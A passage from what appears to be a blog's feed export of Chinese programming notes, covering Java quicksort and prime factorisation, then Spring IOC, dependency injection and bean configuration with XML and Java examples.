args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> arr[] = &#123;<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">6</span>&#125;;</span><br><span class="line">        System.out.println(smallSum(arr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>快速排序：</p><ol><li><p>原理：先选择一个数作为标准（一般为最后一个数），基于这个数将整个数组分成三个部分小于区，大于区，等于区；这个步骤由递归实现，每次递归返回等于区的范围，基于等于区来进行下一次递归</p></li><li><p>代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Partion2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] partion2(<span class="keyword">int</span> arr[],<span class="keyword">int</span> L,<span class="keyword">int</span> R)&#123;</span><br><span class="line">        <span class="keyword">int</span> less = L-<span class="number">1</span>;<span class="comment">//小于区域</span></span><br><span class="line">        <span class="keyword">int</span> more = R;<span class="comment">//大于区域</span></span><br><span class="line">        <span class="keyword">while</span> (L != more)&#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[L] &lt; arr[R])&#123;</span><br><span class="line">                Tool.swap(arr,++less,L++);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (arr[L]&gt;arr[R])&#123;</span><br><span class="line">                Tool.swap(arr,--more,L);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                L++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Tool.swap(arr,R,L);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;less+<span class="number">1</span>,more&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span> arr[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (arr==<span class="keyword">null</span>||arr.length&lt;<span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">        sort(arr,<span class="number">0</span>,arr.length-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (L &lt; R)&#123;</span><br><span class="line">            Tool.swap(arr,(<span class="keyword">int</span>) (L+Math.random()*(R-L+<span class="number">1</span>)),R);</span><br><span class="line">            <span class="keyword">int</span> range[] = Partion2.partion2(arr,L,R);</span><br><span class="line">            sort(arr,L,range[<span class="number">0</span>]-<span class="number">1</span>);</span><br><span class="line">            sort(arr,range[<span class="number">1</span>]+<span class="number">1</span>,R);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> testTime = <span class="number">20</span>;</span><br><span class="line">        <span class="keyword">int</span> maxSize = <span class="number">50</span>;</span><br><span class="line">        <span class="keyword">int</span> maxValue = <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> succeed = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;testTime;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] arr1=Tool.generateRandomArray(maxSize,maxValue);</span><br><span class="line">            <span class="keyword">int</span>[] arr2=Tool.copyArray(arr1);</span><br><span class="line">            Tool.rightMethod(arr1);</span><br><span class="line">            quickSort(arr2);</span><br><span class="line">            <span class="keyword">if</span> (!Tool.isEqual(arr1,arr2))&#123;</span><br><span class="line">                succeed=<span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(succeed ? <span class="string">"结果正确"</span>:<span class="string">"结果不正确"</span>);</span><br><span class="line">        <span class="keyword">int</span>[] arr = Tool.generateRandomArray(maxSize, maxValue);</span><br><span class="line">        Tool.printArray(arr);</span><br><span class="line">        quickSort(arr);</span><br><span class="line">        Tool.printArray(arr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li><p>质因数分解</p><ol><li>递归实现</li></ol><p>对于范围从2到number的每个数，看他是否能整除number，如果能整除那么这个数就是一个素因子，number除以这个数后递归。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归方式实现</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">solve1</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=number;i++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(i==number) &#123;</span><br><span class="line">    System.out.println(number);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((number%i==<span class="number">0</span>)) &#123;</span><br><span class="line">    System.out.println(i);</span><br><span class="line">solve1(number/i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>非递归实现</li></ol><p>对于每个从2到number的数，通过循环判断是否能整除number，如果能整除，就除以这个数后加到列表中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">solve2</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">    List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=number;i++) &#123;</span><br><span class="line">    <span class="keyword">while</span>(number!=i) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((number%i)!=<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    list.add(Integer.valueOf(i));</span><br><span class="line">    number = number/i;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    list.add(Integer.valueOf(number));</span><br><span class="line">    <span class="keyword">for</span>(Integer integer:list) &#123;</span><br><span class="line">    System.out.println(integer.intValue());</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Eratosthenes筛选法</li></ol><p>原理：如果n不是素数，那么n的素因子一定小于n开根号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">solve3</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">while</span>(i*i&lt;=number) &#123;</span><br><span class="line"><span class="keyword">while</span>(number%i==<span class="number">0</span>) &#123;</span><br><span class="line">System.out.println(i);</span><br><span class="line">number=number/i;</span><br><span class="line">&#125;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (number&gt;<span class="number">1</span>) &#123;</span><br><span class="line">System.out.println(number);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>Loading</li></ul><h2 id="剑指offer刷题记录（JAVA实现）"><a href="#剑指offer刷题记录（JAVA实现）" class="headerlink" title="剑指offer刷题记录（JAVA实现）"></a>剑指offer刷题记录（JAVA实现）</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;工具&quot;&gt;&lt;a href=&quot;#工具&quot; class=&quot;headerlink&quot; title=&quot;工具&quot;&gt;&lt;/a&gt;工具&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;交换方法&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
      
    
    </summary>
    
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2019/09/11/JavaSpring/"/>
    <id>http://yoursite.com/2019/09/11/JavaSpring/</id>
    <published>2019-09-11T09:24:38.000Z</published>
    <updated>2019-09-26T13:54:37.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Spring概述"><a href="#Spring概述" class="headerlink" title="Spring概述"></a>Spring概述</h2><ol><li>什么是Spring<ul><li>Spring是一个开放源代码的设计层面框架，<br>他解决的是业务逻辑层和其他各层的松耦合问题，因此它将面向接口的编程思想贯穿整个系统应用。</li><li>Spring是于2003 年兴起的一个轻量级的Java 开发框架</li><li>简单来说，Spring是一个分层的JavaSE/EE full-stack(一站式) 轻量级开源框架。</li></ul></li></ol><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><ol><li><p>什么是IOC</p><ul><li>IOC又叫控制反转，将对象的创建权力反交给Spring</li></ul></li><li><p>传统开发模式</p><ul><li>业务和实现类过于紧密，底层业务更改要修改源代码</li><li>通过工厂可以实现接口和业务的分离</li><li>在工厂内部使用配置文件加载（解析XML-&gt;反射创建对象-&gt;返回对象）</li></ul></li><li><p>Spring-IOC的使用</p><ul><li><p>添加JAR包</p></li><li><p>创建配置文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"demo1.UserDaoOracleImpl"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        name:要注入的属性名称</span></span><br><span class="line"><span class="comment">        value:注入(赋值)的值</span></span><br><span class="line"><span class="comment">        属性:要提供set方法</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"lk123456"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一个<code>&lt;bean&gt;&lt;/bean&gt;</code>标签里管理一个类的对象</p><p><code>id</code>属性是用于获取对象的唯一标识</p><p><code>class</code>属性是获取哪个类的对象</p></li></ul></li><li><p>测试使用</p><p>接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接口实现类<code>UserDaoOracleImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserDaoOracleImpl</span> <span class="keyword">implements</span> <span class="title">UserDao</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"oracle-save"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"oracle-delete"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//spring</span></span><br><span class="line">        <span class="comment">//1.加载配置文件</span></span><br><span class="line">        ApplicationContext applicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.根据id获取对象</span></span><br><span class="line">        UserDao userDao = (UserDao) applicationContext.getBean(<span class="string">"userDao"</span>);</span><br><span class="line">        userDao.save();</span><br><span class="line">        userDao.delete();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用的时候我们用接口类的来创建对象，假如我们想更改实现方式，只需实新的类以及修改配置文件即可，不需要修改实现的代码。</p></li></ol><h2 id="DI"><a href="#DI" class="headerlink" title="DI"></a>DI</h2><ol><li><p>依赖注入</p><ul><li>给spring管理类当中依赖的属性,通过配置文件进行赋值的过程</li></ul></li><li><p>传统方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="comment">//传统</span></span><br><span class="line">       UserDaoOracleImpl userDaoOracle = <span class="keyword">new</span> UserDaoOracleImpl();</span><br><span class="line">       userDaoOracle.name = <span class="string">"lk"</span>;</span><br><span class="line">       System.out.println(userDaoOracle.name);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>使用面向接口的编程方式没有办法设置属性值</p></li><li><p>DI方式</p><ul><li><p>实现类当中的属性要提供set方法</p></li><li><p>在配置文件当中配置依赖注入</p><p>通过<code>property</code>标签设置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"userDao"</span> <span class="attr">class</span>=<span class="string">"demo1.UserDaoOracleImpl"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        name:要注入的属性名称</span></span><br><span class="line"><span class="comment">        value:注入(赋值)的值</span></span><br><span class="line"><span class="comment">        属性:要提供set方法</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"lk123456"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="Bean相关配置"><a href="#Bean相关配置" class="headerlink" title="Bean相关配置"></a>Bean相关配置</h2><ol><li><p>名称与标识：</p><ul><li>id：使用了约束中的唯一约束。里面不能出现特殊字符的</li><li>name：没有使用约束中的唯一约束。里面可以出现特殊字符。</li></ul></li><li><p>设置对象的生命周期方法</p><ul><li><p><code>init-method</code>：Bean被初始化的时候执行的方法</p></li><li><p><code>destroy-method</code>：Bean被销毁的时候执行的方法（Bean是单例创建，工厂关闭）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"person"</span> <span class="attr">class</span>=<span class="string">"demo2.Person"</span> <span class="attr">init-method</span>=<span class="string">"init"</span> <span class="attr">destroy-method</span>=<span class="string">"destroy"</span> <span class="attr">scope</span>=<span class="string">"prototype"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"faint-star"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当加载配置文件时调用<code>init-method</code>，当关闭工厂时调用<code>destroy-method</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//加载核心配置文件(此时创建实例，执行init方法，创建文件里的所有对象)</span></span><br><span class="line">        ClassPathXmlApplicationContext classPathXmlApplicationContext = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">        Person person = (Person) classPathXmlApplicationContext.getBean(<span class="string">"person"</span>);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">        <span class="comment">//关闭工厂,所有对象都会销毁----单例</span></span><br><span class="line">        classPathXmlApplicationContext.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Bean的作用范围的配置</p><ul><li><code>singleton</code>：默认的，Spring会采用单例模式创建这个对象。</li><li><code>prototype</code>：多例模式。</li><li><code>request</code>：应用在web项目中，Spring创建这个类以后，将这个对象存入到request范围中。</li><li><code>session</code>：应用在web项目中，Spring创建这个类以后，将这个对象存入到session范围中</li><li><code>globalsession</code>：应用在web项目中，必须在porlet(基于Java的Web组件，子域名)环境下使用。但是如果没有这种环境，相对于session。</li></ul></li><li><p>工厂实例化的方式</p><ul><li><p>无参构造-默认</p><p>只需提供一个默认构造函数即可</p></li><li><p>静态工厂实例化</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"user"</span> <span class="attr">class</span>=<span class="string">"demo3.User"</span> <span class="attr">factory-method</span>=<span class="string">"createUser"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jws.soap.SOAPBinding;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="comment">//    public User()&#123;</span></span><br><span class="line"><span class="comment">//        super();</span></span><br><span class="line"><span class="comment">//        System.out.println("默认构造方法");</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> User <span class="title">createUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"调用了createUser"</span>);</span><br><span class="line">        <span class="comment">//必须返回对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分模块配置"><a href="#分模块配置" class="headerlink" title="分模块配置"></a>分模块配置</h2><ol><li>在加载时，添加多个配置文件名称</li><li>在一个配置文件当中引入另一个配置文件</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入另外的配置文件--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">import</span> <span class="attr">resource</span>=<span class="string">"applicationContext2.xml"</span>/&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Spring属性注入"><a href="#Spring属性注入" class="headerlink" title="Spring属性注入"></a>Spring属性注入</h2><ol><li><p>构造方法方式属性注入</p><ul><li><p>待注入类中实现一个带参数的构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,Integer age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">        <span class="keyword">this</span>.age=age;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p><code>bean</code>中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"潘星波"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">"age"</span> <span class="attr">value</span>=<span class="string">"10"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>Set方法的属性注入</p><ul><li><p>待注入类中给待注入的参数实现set方法</p></li><li><p>bean中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">"faint-star"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>P名称空间的属性注入</p><ul><li><p>使用p名称空间，就不需要写那那么多的property</p></li><li><p>使用时，要添加名称空间</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlns:p="http://www.springframework.org/schema/p"</span><br></pre></td></tr></table></figure></li><li><p><code>bean</code>中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dog"</span> <span class="attr">class</span>=<span class="string">"demo4.Dog"</span> <span class="attr">p:age</span>=<span class="string">"10"</span> <span class="attr">p:name</span>=<span class="string">"wc"</span> <span class="attr">p:color</span>=<span class="string">"red"</span>&gt;</span><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>集合类型注入</p><p>数组、List、Map、Set都要先定义set方发</p><ul><li><p>数组bean中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--数组--&gt;</span></span><br><span class="line">        